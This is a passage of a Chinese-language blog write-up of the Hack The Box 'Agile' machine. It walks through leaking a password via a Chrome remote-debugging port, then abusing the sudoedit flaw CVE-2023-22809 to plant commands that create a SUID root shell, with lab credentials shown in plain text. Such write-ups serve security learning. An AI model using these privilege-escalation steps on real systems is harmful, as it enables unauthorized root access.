class="line">    <span class="keyword">yield</span> driver</span><br><span class="line">    driver.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_login</span>(<span class="params">driver</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;starting test_login&quot;</span>)</span><br><span class="line">    driver.get(<span class="string">&#x27;http://test.superpass.htb/account/login&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    username_input = driver.find_element(By.NAME, <span class="string">&quot;username&quot;</span>)</span><br><span class="line">    username_input.send_keys(username)</span><br><span class="line">    password_input = driver.find_element(By.NAME, <span class="string">&quot;password&quot;</span>)</span><br><span class="line">    password_input.send_keys(password)</span><br><span class="line">    driver.find_element(By.NAME, <span class="string">&quot;submit&quot;</span>).click()</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    title = driver.find_element(By.TAG_NAME, <span class="string">&quot;h1&quot;</span>)</span><br><span class="line">    <span class="keyword">assert</span> title.text == <span class="string">&quot;Welcome to your vault&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_add_password</span>(<span class="params">driver</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;starting test_add_password&quot;</span>)</span><br><span class="line">    driver.find_element(By.NAME, <span class="string">&quot;add_password&quot;</span>).click()</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    site = driver.find_element(By.NAME, <span class="string">&quot;url&quot;</span>)</span><br><span class="line">    site.send_keys(<span class="string">&quot;test_site&quot;</span>)</span><br><span class="line">    username = driver.find_element(By.NAME, <span class="string">&quot;username&quot;</span>)</span><br><span class="line">    username.send_keys(<span class="string">&quot;test_user&quot;</span>)</span><br><span class="line">    driver.find_element(By.CLASS_NAME, <span class="string">&quot;fa-save&quot;</span>).click()</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> <span class="string">&#x27;test_site&#x27;</span> <span class="keyword">in</span> driver.page_source</span><br><span class="line">    <span class="keyword">assert</span> <span class="string">&#x27;test_user&#x27;</span> <span class="keyword">in</span> driver.page_source</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_del_password</span>(<span class="params">driver</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;starting test_del_password&quot;</span>)</span><br><span class="line">    password_rows = driver.find_elements(By.CLASS_NAME, <span class="string">&quot;password-row&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> password_rows:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;test_site&quot;</span> == row.find_elements(By.TAG_NAME, <span class="string">&quot;td&quot;</span>)[<span class="number">1</span>].text <span class="keyword">and</span> \</span><br><span class="line">            <span class="string">&quot;test_user&quot;</span> == row.find_elements(By.TAG_NAME, <span class="string">&quot;td&quot;</span>)[<span class="number">2</span>].text:</span><br><span class="line">            row.find_element(By.CLASS_NAME, <span class="string">&quot;fa-trash&quot;</span>).click()</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">assert</span> <span class="string">&#x27;test_site&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> driver.page_source</span><br><span class="line">    <span class="keyword">assert</span> <span class="string">&#x27;test_user&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> driver.page_source</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_title</span>(<span class="params">driver</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;starting test_title&quot;</span>)</span><br><span class="line">    driver.get(<span class="string">&#x27;http://test.superpass.htb&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">assert</span> <span class="string">&quot;SuperPassword 🦸&quot;</span> == driver.title</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_long_running</span>(<span class="params">driver</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;starting test_long_running&quot;</span>)</span><br><span class="line">    driver.get(<span class="string">&#x27;http://test.superpass.htb&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">550</span>)</span><br><span class="line">    <span class="comment">#time.sleep(5)</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="string">&quot;SuperPasword 🦸&quot;</span> == driver.title</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>从文件中发现”–remote-debugging-port&#x3D;41829”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">corum@agile:/app/app-testing$ netstat -ltun|grep 41829</span><br><span class="line">tcp        0      0 127.0.0.1:41829         0.0.0.0:*               LISTEN     </span><br></pre></td></tr></table></figure>

<p>本地端口转发</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 41829:localhost:41829 corum@superpass.htb</span><br></pre></td></tr></table></figure>

<p>打开 Chromium 并<code>chrome://inspect</code>转到设备页面</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125213407.png"></p>
<p>单击“done”会显示一个新的远程目标：</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125213433.png"></p>
<p>单击“inspect”会弹出一个连接到测试 selenium 的开发工具实例：</p>
<p>从中可以发现”edwards”用户的密码：”d07867c6267dcb5df0af”</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20240125213604.png"></p>
<h2 id="user-edwards"><a href="#user-edwards" class="headerlink" title="user-edwards"></a>user-edwards</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">corum@agile:~$ su edwards</span><br><span class="line">Password: d07867c6267dcb5df0af</span><br></pre></td></tr></table></figure>

<p>权限检查</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">edwards@agile:~$ sudo -l</span><br><span class="line">[sudo] password for edwards: </span><br><span class="line">Matching Defaults entries for edwards on agile:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User edwards may run the following commands on agile:</span><br><span class="line">    (dev_admin : dev_admin) sudoedit /app/config_test.json</span><br><span class="line">    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现可以用<code>dev_admin</code>用户的<code>sudoedit</code>命令编辑两个文件；这两个文件似乎并没有什么帮助；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo -u dev_admin sudoedit /app/config_test.json</span><br><span class="line">&#123;</span><br><span class="line">&quot;SQL_URI&quot;:</span><br><span class="line">&quot;mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt</span><br><span class="line">edwards:1d7ffjwrx#$d6qn!9nndqgde4</span><br></pre></td></tr></table></figure>



<p>sudo版本从1.8.0到1.9.12p1之间存在<a target="_blank" rel="noopener" href="https://security-tracker.debian.org/tracker/CVE-2023-22809">CVE-2023-22809</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">edwards@agile:~$ sudo --version</span><br><span class="line">Sudo version 1.9.9</span><br><span class="line">Sudoers policy plugin version 1.9.9</span><br><span class="line">Sudoers file grammar version 48</span><br><span class="line">Sudoers I/O plugin version 1.9.9</span><br><span class="line">Sudoers audit plugin version 1.9.9</span><br></pre></td></tr></table></figure>

<p>此漏洞允许用户在用户提供的环境变量中提供额外的参数，从而允许攻击者访问配置允许的其他文件以进行处理。此处应用允许 edwards 将任何文件写入 dev_admin，而不仅仅是这两个。</p>
<p>我们只能编辑以前作为dev_admin找到的文件。在&#x2F;app中找到的test_and_upgrade.sh bash脚本显示了一个有趣的命令，特别<code>source /app/venv/bin/activate </code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">edwards@agile:/app$ <span class="built_in">cat</span> test_and_update.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment"># update prod with latest from testing constantly assuming tests are passing</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Starting test_and_update&quot;</span></span><br><span class="line"><span class="built_in">date</span></span><br><span class="line"><span class="comment"># if already running, exit</span></span><br><span class="line">ps auxww | grep -v <span class="string">&quot;grep&quot;</span> | grep -q <span class="string">&quot;pytest&quot;</span> &amp;&amp; <span class="built_in">exit</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Not already running. Starting...&quot;</span></span><br><span class="line"><span class="comment"># start in dev folder</span></span><br><span class="line"><span class="built_in">cd</span> /app/app-testing</span><br><span class="line"><span class="comment"># system-wide source doesn&#x27;t seem to happen in cron jobs</span></span><br><span class="line"><span class="built_in">source</span> /app/venv/bin/activate</span><br><span class="line"><span class="comment"># run tests, exit if failure</span></span><br><span class="line">pytest -x 2&gt;&amp;1 &gt;/dev/null || <span class="built_in">exit</span></span><br><span class="line"><span class="comment"># tests good, update prod (flask debug mode will load it instantly)</span></span><br><span class="line"><span class="built_in">cp</span> -r superpass /app/app/</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Complete!&quot;</span></span><br></pre></td></tr></table></figure>

<p>我们可以看到，该文件由根目录所有，组归dev_admin所有，后者拥有编辑该文件的权限。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edwards@agile:~$ ls -al /app/venv/bin/activate</span><br><span class="line">-rw-rw-r-- 1 root dev_admin 1976 Aug 5 17:03 /app/venv/bin/activate</span><br></pre></td></tr></table></figure>

<p>利用<a target="_blank" rel="noopener" href="https://security-tracker.debian.org/tracker/CVE-2023-22809">CVE-2023-22809</a>往<code>/app/venv/bin/activate</code>写恶意代码；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EDITOR=&#x27;vim -- /app/venv/bin/activate&#x27; sudoedit -u dev_admin /app/config_test.json</span><br></pre></td></tr></table></figure>

<p>恶意代码如下；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/bash /tmp/zixyd</span><br><span class="line">chmod 4777 /tmp/zixyd</span><br></pre></td></tr></table></figure>

<p>最后等几分钟，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">edwards@agile:~<span class="comment"># ls -al /tmp/zixyd</span></span><br><span class="line">-rwsrwxrwx 1 root root 1396520 Jan 25 14:04 /tmp/zixyd</span><br><span class="line">edwards@agile:~<span class="comment"># /tmp/zixyd -p</span></span><br><span class="line">edwards@agile:~<span class="comment"># cd /root</span></span><br><span class="line">edwards@agile:/root<span class="comment"># </span></span><br></pre></td></tr></table></figure>

</p></div><div class="post-footer"><div class="tip">All rights reserved<br>Author: zIxyd</div><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2024-01-25</span><i class="fa fa-tag"></i><a class="tag" href="/tags/HTB/" title="HTB">HTB </a><span class="leancloud_visitors"></span><span>About 3002 words, 10 min 0 sec  read</span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/intent/tweet?text=I%20have%20found%20a%20great%20blog.%0A%0AzIxyd's%20Blog%20%C2%B7%20Agile(HTB)%0Ahttps://zIxyd.github.io/2024/01/25/Agile(HTB)/%0A"></a></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/2024/01/25/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" title="frp+proxifier内网穿透">Next</a></li></ul></div><script src="/js/visitors.js"></script></div></div></div></div><script src="/js/darkLightToggle.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div></body></html>